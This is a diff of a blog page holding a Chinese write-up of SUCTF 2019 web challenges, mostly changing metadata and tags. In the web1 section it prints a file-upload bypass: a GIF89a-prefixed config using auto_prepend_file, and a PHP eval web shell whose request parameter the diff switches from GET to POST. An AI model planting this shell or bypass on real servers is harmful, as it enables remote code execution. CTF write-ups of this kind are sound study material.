@@ -12,7 +12,7 @@
   <meta name="referrer" content="no-referrer">
   <!--more-->
   <meta name="description" content="这两天头有点晕，suctf随便做做">
-<meta name="keywords" content="web,wp">
+<meta name="keywords" content="wp,web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="suctf2019 web">
 <meta property="og:url" content="http://yoursite.com/2019/08/17/suctf2019-web/index.html">
@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006Xmmmgly1g64odgejwdj310i0a2js0.jpg">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmgly1g68h88g4v9j30gl0a2764.jpg">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmgly1g68fn8n8ltj30jm0dwjro.jpg">
-<meta property="og:updated_time" content="2019-08-23T02:01:09.993Z">
+<meta property="og:updated_time" content="2019-08-26T09:56:56.096Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="suctf2019 web">
 <meta name="twitter:description" content="这两天头有点晕，suctf随便做做">
@@ -188,7 +188,6 @@
 <p>这两天头有点晕，suctf随便做做</p>
 </blockquote>
 <meta name="referrer" content="no-referrer">
-
 <a id="more"></a>
 
 <h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>本来是没啥思路的，上传.htaccess成功但是不被解析。。。。😥</p>
@@ -200,7 +199,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure>
 
 <p>继续上传1.jpg</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_GET[cmd])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&apos;php&apos;&gt;@eval($_POST[cmd])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>访问路径</p>
 <p><img src="https://ws3.sinaimg.cn/large/006Xmmmggy1g62nppqfonj30t20du0tm.jpg" alt="1566023141824"></p>
@@ -414,11 +413,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		
 		</ul>
@@ -618,10 +617,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">wp</a>
               </li>
              
@@ -646,15 +641,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">start</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网穿透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
               <li class="article-tag-list-item">
